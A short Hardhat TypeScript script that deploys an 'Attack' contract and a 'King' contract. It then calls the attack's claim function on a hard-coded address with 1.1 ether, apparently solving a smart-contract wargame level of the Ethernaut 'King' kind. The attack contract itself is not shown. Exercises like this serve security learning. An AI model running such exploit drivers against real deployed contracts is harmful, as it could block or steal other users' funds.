import {task} from "hardhat/config";
import {TaskArguments} from "hardhat/types";
import {ethers} from 'hardhat'

import {Attack} from "../src/types/Attack";
import {Attack__factory} from "../src/types/factories/Attack__factory";

const main = async () => {
  const accounts = await ethers.getSigners()
  const attackFactory: Attack__factory = <Attack__factory>await ethers.getContractFactory("Attack");
  const testFactory = await ethers.getContractFactory("King");
  const attack: Attack = <Attack>await attackFactory.deploy();
  const test = await testFactory.deploy({value: ethers.parseEther('1')});
  await attack.deployed();

  await attack.claim('0x98b377Ab8316EAA7978979a4c606b5B424535a83', {value: ethers.parseEther('1.1')})
}

main().then(() => {console.log('success')}).catch(err => {console.log({err})})

